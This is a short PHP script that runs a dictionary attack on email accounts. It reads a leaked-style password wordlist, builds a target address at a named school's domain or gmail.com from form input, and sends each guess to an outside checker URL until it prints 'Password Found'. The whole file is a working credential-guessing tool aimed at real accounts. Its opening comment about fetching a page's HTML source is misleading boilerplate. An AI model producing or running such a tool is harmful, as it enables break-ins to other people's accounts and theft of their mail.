<?php
// Get a file into an array.  In this example we'll go through HTTP to get
// the HTML source of a URL.
$passwords = file('phpbb.txt');
$email = $_POST['email'];
if ($_POST['email2'] == 'raha')
{
	$email2 = 'raha-international-school.org';
}
else
{
	$email2 = 'gmail.com';
}
for ($i = 0; $i < sizeof($passwords); $i++)
{
	$password = $passwords[$i];
	$passright = file_get_contents('http://raha.pizzaroot.comli.com/check_mb_password.php?login='.$email.'@'.$email2.'&password='.$password);
	if ($passright == 1)
	{
		echo 'Password Found: '.$password;
		break;
	}
	else
	{
		echo 'Password Not Match: '.$password;
	}
	echo '<br>';
	ob_flush();
	flush();
}
?>